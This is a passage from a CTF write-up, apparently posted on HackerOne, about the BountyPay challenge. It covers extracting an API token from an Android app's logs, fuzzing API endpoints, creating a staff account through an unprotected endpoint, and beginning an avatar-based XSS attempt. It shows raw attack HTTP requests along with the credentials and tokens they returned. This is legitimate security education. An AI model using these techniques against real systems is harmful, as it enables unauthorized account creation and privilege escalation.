nexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=54fbf88770ff09ad87384c03e9059fb5459c8900aa32556ae7d0f265e5db2042\" data-attachment-type=\"text/plain\"\u003ectf_part2.py (F859852)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAfter killing the app and running the script, there\u0026#39;s a hash displayed on the screen (459a6f79ad9b13cbcb5f692d2cc7a94d), and a box prompting for a \u0026#39;Header\u0026#39; value. From reading the code, we can see this must start with \u0026#39;X-\u0026#39; to move on, so the hash that\u0026#39;s displayed probably isn\u0026#39;t what it\u0026#39;s asking for. Peeking ahead at \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"PartThreeActivity.java\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UUDQcXGt4LrNiSNjNzcGhrxf?response-content-disposition=attachment%3B%20filename%3D%22PartThreeActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartThreeActivity.java\u0026amp;response-content-type=text%2Fx-java\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=ac57be5e677eba95f51abceff022cb31c8a8e8e92f134d1e21981e8e187bb3a3\" data-attachment-type=\"text/x-java\"\u003ePartThreeActivity.java (F859857)\u003c/a\u003e , we see a few base64-encoded strings. Decoding them, we find that \u003ccode\u003eWC1Ub2tlbg==\u003c/code\u003e is \u003ccode\u003eX-Token\u003c/code\u003e. I type \u0026#39;X-Token\u0026#39; into the field and we\u0026#39;re on to part 3.\u003c/p\u003e\n\n\u003ch3 id=\"partthreeactivity\"\u003ePartThreeActivity\u003c/h3\u003e\n\n\u003cp\u003eSource: \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"PartThreeActivity.java\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UUDQcXGt4LrNiSNjNzcGhrxf?response-content-disposition=attachment%3B%20filename%3D%22PartThreeActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartThreeActivity.java\u0026amp;response-content-type=text%2Fx-java\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=ac57be5e677eba95f51abceff022cb31c8a8e8e92f134d1e21981e8e187bb3a3\" data-attachment-type=\"text/x-java\"\u003ePartThreeActivity.java (F859857)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eReading the code, it\u0026#39;s very similar to part one, except some of the query parameters are expected to be base64 encoded. I update the Frida script accordingly.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"ctf_part3.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MXJiXKQ9cpesTbteGJGqVPYP?response-content-disposition=attachment%3B%20filename%3D%22ctf_part3.py%22%3B%20filename%2A%3DUTF-8%27%27ctf_part3.py\u0026amp;response-content-type=text%2Fplain\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3UNE4J5L%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070731Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCz7kjO3QyFP7jGDkA5krNaLE6O2p1tR4x0TQtjMemDwQIhALc5Qo7beEygqpMNylJrOurNEmXX%2FUaJ7i3JOGstSxsEKrQDCFcQARoMMDEzNjE5Mjc0ODQ5IgxX2Y8wmCeqyUWE5MQqkQO1SEq9Kl%2BewQlhrlfUoVvv9N1OLaMkWrWIlv8SukYusm40FYD0qUCOJT%2BzitdeP3Kr9dqa%2BJmxV7c3%2BjXo4WulUP6OrfhUn0Rcu3T1VRcH6Qpx%2FGLAa4zE5IBGMdsXZEcR335EaBEylCpdLxObdeJZ8wmT%2FiMsJqVnexQRWK0gOcg8%2BaAe0Z4MQhfL%2FVbk8%2Botr0dFlI%2FaPx8jXCrTw%2FTlRp0P9OtpSvUQA1RBVrS5L3ZNrC33bQ4md%2B9KmXmIycB047RJuvaypZW9qepGhczrUMsYabbxifZ%2FJ17yJLs39h1ENkrjIFD7f9gA%2F9u%2BsTKrtFMmGu8%2FrThH1%2FAJX2J2V%2FiXJ%2Fj2flmFEXmyNg7XqFuZ2VEFhEknqlw0sjyH5ibXryf8lYs%2FL9ye%2FbGye3G8MgjG1rQQkaNLm9nZxru2uR4y5NwW33D%2F%2F27wPuxj5YAD30GEm3l3%2BfNuoV8Y%2Fa6KBiEG2ZFNI%2Fu9t%2F7aALxmsSX49Fkt%2Fvbd%2B2ORICgPABnOO5GRZQldPJ3fh%2FPtVXm3oDDyjav%2FBTrqAWjMucnwKi73c9CZ4eV75rJ5%2B4PnghCALwGiHX4zE11a5NOtuIpj8v3a2y9AJMGR0JyOdjGEipkC8KkLqeEMFaYnCk4oCce5NwJVnhh%2F8yBh%2BJDy7WhfYG2qUirylB1Ud3rl1KSDWno%2BbVYDQgs2rcyOKmLb%2FH1USBmJPVZi3%2FK%2F%2FJ6%2BATEV10VMohl2iHY7GlXPewFvZ2tG%2FogGkzwNQUb%2BD2o7r0beeLXek5XslTtgqNCoDP9xL1i88F02X5Buj81GAIlEB1qQFUoRMd2N%2Fu0SnL64HSNiPSzstRRJidfEI6C%2F%2FcDv%2BmWfcA%3D%3D\u0026amp;X-Amz-Signature=5410ae1a67784a77329d6ef377aeb90e2e1ac03c55189c3e8bbd78619ab1c992\" data-attachment-type=\"text/plain\"\u003ectf_part3.py (F859854)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAfter killing the app and running the script, there\u0026#39;s a box prompting for a leaked hash value. I try the hash from part two and it doesn\u0026#39;t work.\u003c/p\u003e\n\n\u003cp\u003eI notice in the source there are some calls to print a token to the logs, which would appear in the Logcat window in Android Studio. But those messages don\u0026#39;t seem to have happened.\u003c/p\u003e\n\n\u003cp\u003eWhile wondering what to do next, I notice that after a delay, these messages start appearing in the logs:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebounty.pay I/TAG: Starting authentication\nbounty.pay D/TAG: signInAnonymously:success\nbounty.pay I/TAG: Getting host endpoint\nbounty.pay I/TAG: Getting Token\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eMaybe now that it\u0026#39;s had time to fetch them, they\u0026#39;ll be printed if we retry it?\u003c/p\u003e\n\n\u003cp\u003eI click the back button in the emulator, and resubmit the form for PartTwoActivity. Now in the logs we see:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebounty.pay D/HOST IS:: http://api.bountypay.h1ctf.com\nbounty.pay D/TOKEN IS:: 8e9998ee3137ca9ade8f372739f062c1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eEntering that token into the PartThreeActivity, a congratulations screen appears. We\u0026#39;ve now got a token for the API server!\u003c/p\u003e\n\n\u003ch1 id=\"api-bountypay-h1ctf-com\"\u003eapi.bountypay.h1ctf.com\u003c/h1\u003e\n\n\u003cp\u003eNow that I have an API token, I use Intruder to try other HTTP methods on the one endpoint we know about:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/api/accounts/F8gHiqSdpK/statements?month=04\u0026amp;year=2020\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNothing happens. I then try adding punctuation to each part of the path, query parameters, and token header value. Nothing interesting happens.\u003c/p\u003e\n\n\u003cp\u003eNext I use ffuf to look for other methods and find the \u003ccode\u003e/api/staff\u003c/code\u003e method. It responds with:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e[{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Sam Jenkins\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;staff_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;STF:84DJKEIP38\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e},{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Brian Oliver\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;staff_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;STF:KE624RQ2T9\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI then use Intruder to try other HTTP methods on this endpoint. POST returns the following message:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Missing Parameter\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI add name as a body parameter. Same message.\u003c/p\u003e\n\n\u003cp\u003eThen I try staff_id with a value from the GET response.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/api/staff/\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e23\u003c/span\u003e\n\nstaff_id=STF:84DJKEIP38\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe following message is returned:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Staff Member already has an account\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAh, so this is making a new staff member account. Sandra from Twitter doesn\u0026#39;t seem to be in the list. Let\u0026#39;s try her ID (STF:8FJ3KFISL3)\u003c/p\u003e\n\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;description\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Staff Member Account Created\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;sandra.allison\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;s%3D8qB8zEpMnc*xsz7Yp5\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"staff-bountypay-h1ctf-com\"\u003estaff.bountypay.h1ctf.com\u003c/h1\u003e\n\n\u003ch2 id=\"getting-in\"\u003eGetting in\u003c/h2\u003e\n\n\u003cp\u003eVisiting the site, we are redirected to \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%3Dticket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/?template=login\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003cbr\u003e\nIn the last section we saw that Brian Oliver is supposedly a staff member. I try logging in with the credentials we used for him on the app site and they don\u0026#39;t work. I then use the credentials the API server gave us for Sandra and they work. The cookie looks like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003etoken=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"a-quick-look-around\"\u003eA quick look around\u003c/h2\u003e\n\n\u003cp\u003eThe main page is \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%3Dhome\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/?template=home\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe functionality of the site is minimal. The dashboard has two tabs:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eA list of support tickets, with only one ticket. Viewing a ticket has its on template: \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%3Dticket%26ticket_id%3D3582\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/?template=ticket\u0026amp;ticket_id=3582\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eA form to change your profile name and avatar. This posts to \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2F%3Ftemplate%3Dhome\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/?template=home\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eIn Burp proxy history, we see that a file \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2Fjs%2Fwebsite.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewebsite.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e was loaded. It contains functions calling two additional pages:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2Fadmin%2Fupgrade%3Fusername%3Dsandra.allison\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/admin/upgrade?username=sandra.allison\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to upgrade a user to admin. It can be called with a GET request, but trying it gives an error: \u0026quot;Only admins can perform this\u0026quot;\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2Fadmin%2Freport%3Furl%3DLz90ZW1wbGF0ZT1ob21l\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/admin/report?url=Lz90ZW1wbGF0ZT1ob21l\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to report a page for the admin to review. The URL parameter is base64 encoded. In response it returns \u0026quot;Report received\u0026quot;. Reporting the /admin/upgrade URL returns the same response and nothing happens.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"dead-ends\"\u003eDead ends\u003c/h2\u003e\n\n\u003cp\u003eI begin by testing all of the parameters observed for signs of injection vulnerabilities using my trusty wordlist of punctuation marks. Nothing stands out.\u003c/p\u003e\n\n\u003cp\u003eI test all the parameters for what happens if you turn them into an array. Nothing stands out.\u003c/p\u003e\n\n\u003cp\u003eI call /admin/report with the url parameter pointing at a Burp collaborator URL as well as my SSRF testing toy app. No requests are received.\u003c/p\u003e\n\n\u003cp\u003eI test the template parameter for path traversal and local file inclusion. Doesn\u0026#39;t seem to work.\u003c/p\u003e\n\n\u003ch2 id=\"another-dead-end\"\u003eAnother dead end\u003c/h2\u003e\n\n\u003cp\u003eWhile token cookie format doesn\u0026#39;t look like base64-encoded JSON, I try decoding it as base64 anyway.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esIluEVmypbzy/Un0njpgLfyONobB8ao8pxKJhQBdhRTpg1SCXylVDJrRjrr0JeMlTdnr/Ss32wXInW6cEKYyOQCu5MdRO1/SMkCXAd80mDdemzDFVyYYTuVzx04Vy1ilQmOBQP6tUh97pAYcoCim+vwDdaQu7PGRaRn6d4zG\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOdd, that still looks like base64. Decoding it again returns a blob of unprintable stuff.\u003c/p\u003e\n\n\u003cp\u003eWhile testing the profile name change functionality I noticed the cookie value got longer when I used longer profile names. This suggests the cookie is actually storing the state for this and there\u0026#39;s no backing database. While this site is supposed to act like a real site, it makes sense that it would be implemented this way. It seems unlikely that breaking the cookie is the intended solution here. I still put a few hours into it and was unsuccessful.\u003c/p\u003e\n\n\u003ch2 id=\"half-an-xss\"\u003eHalf an XSS\u003c/h2\u003e\n\n\u003cp\u003eTaking a closer look at \u003ca href=\"/redirect?url=https%3A%2F%2Fstaff.bountypay.h1ctf.com%2Fjs%2Fwebsite.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewebsite.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, we see the makings of what could be an XSS.\u003c/p\u003e\n\n\u003cp\u003eIf the URL hash matches \u0026#39;tab[1-4]\u0026#39; the code will trigger the onClick event on elements with that class on page load. The onClick event for  \u0026#39;upgradeToAdmin\u0026#39; will trigger the request to upgrade the username specified in the \u0026#39;username\u0026#39; input field. The inclusion of tab4 in the hash code seems odd since the dashboard markup only has tab1, tab2, and tab3. Maybe the username field is on tab4 for admins.\u003c/p\u003e\n\n\u003cp\u003eLooking around for an opportunity to inject a class name in the markup, we see that the user avatar setting is used as a CSS class name. Intercepting the POST request to change the profile name, we modify it to change the avatar value:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/?template=home\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003estaff.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e77\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan 